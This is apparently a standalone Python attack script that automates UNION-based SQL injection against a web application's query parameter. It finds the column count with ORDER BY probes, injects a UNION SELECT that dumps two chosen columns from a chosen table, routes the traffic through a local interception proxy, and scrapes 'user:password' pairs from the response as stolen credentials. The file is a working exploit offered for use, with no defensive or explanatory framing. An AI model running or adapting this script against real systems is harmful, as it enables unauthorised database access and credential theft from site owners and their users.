import re
import sys
import requests
import urllib3
import time

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
s = requests.Session()

# ANSI color codes
BLUE = '\033[94m'
BLUE_BOLD = '\033[1;94m'
GREEN = '\033[92m'
GREEN_BOLD = '\033[1;92m'
RED = '\033[91m'
RED_BOLD = '\033[1;91m'
BOLD = '\033[1m'
ENDC = '\033[0m'  # Reset color

def cols_count(url, path):
	print(f'{BLUE_BOLD}[*]{ENDC} Calculating total columns...')
	time.sleep(1)
	for i in range(1, 20):
		count_payload = "'+order+by+%s--" %i
		r = requests.get(url + path + count_payload, verify=False, proxies=proxies)
		res = r.text
		if "Internal Server Error" in res:
			return i - 1
		i += 1
	return False

def generate_payload(url, path, cols1, cols2, tables, cols_total):
    total_cols = cols_total
    for i in range(total_cols):
        kosong = ['null'] * total_cols
        kosong[i] = f"{cols1}+||+':'+||+{cols2}+from+{table}"
        string_payload = "'+union+select+%s--" % ','.join(kosong)
        # print(f'Testing payload: {string_payload}')
        r = requests.get(url + path + string_payload, verify=False, proxies=proxies)
        res = r.text
        # print(res)
        if "Internal Server Error" not in res:
        	return f'{url+path+string_payload}'

def attack(payload):
    r = s.get(payload, verify=False, proxies=proxies)
    # print(r.status_code)
    if r.status_code == 200:
        print(f'{GREEN_BOLD}[+]{ENDC} SQLI {GREEN}successfully{ENDC} executed!')
        time.sleep(1.5)
        print(f'{BLUE_BOLD}[*]{ENDC} Trying to retrieve data...')
        time.sleep(1.5)
        # Parsing HTML
        soup = BeautifulSoup(r.text, 'html.parser')
        creds = []
        # Cari tr elements
        rows = soup.find_all('tr')
        for row in rows:
            th_element = row.find('th')
            # print(th_element)
            # print(type(th_element))
            if th_element:
                th_text = th_element.text.strip()
                # print(th_text)
                if re.match(r'^([a-zA-Z0-9]+:[a-zA-Z0-9]+)$', th_text):
                    creds.append(th_text)
                    # print(th_text)
    else:
    	print(f'{RED_BOLD}[-]{ENDC} {RED}We have failed to retrieve data!{ENDC}')
    return creds


if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		path = sys.argv[2].strip()
		cols1 = sys.argv[3].strip()
		cols2 = sys.argv[4].strip()
		table = sys.argv[5].strip()
	except IndexError:
		print('[-] Usage %s <url> <path>' % sys.argv[0])
		print('[-] Example: %s www.example.com /filter?category=office' % sys.argv[0])
		sys.exit(-1)

	num_columns = cols_count(url, path)
	if num_columns:
		print(f'{GREEN_BOLD}[+]{ENDC} Total of columns in original query is {GREEN}{str(num_columns)}{ENDC}')
		payload = generate_payload(url, path, cols1, cols2, table, num_columns)
		print(f'{GREEN_BOLD}[+]{ENDC} This payload is successful: {GREEN}{payload}{ENDC}')
		print(f'{GREEN_BOLD}[+]{ENDC} Success in retrieving the data : {GREEN}{attack(payload)}{ENDC}')
	else:
		print(f'{RED_BOLD}[-]{ENDC} Cannot determine the number of columns')
		print(f'{RED_BOLD}[-]{ENDC} SQLI has failed')
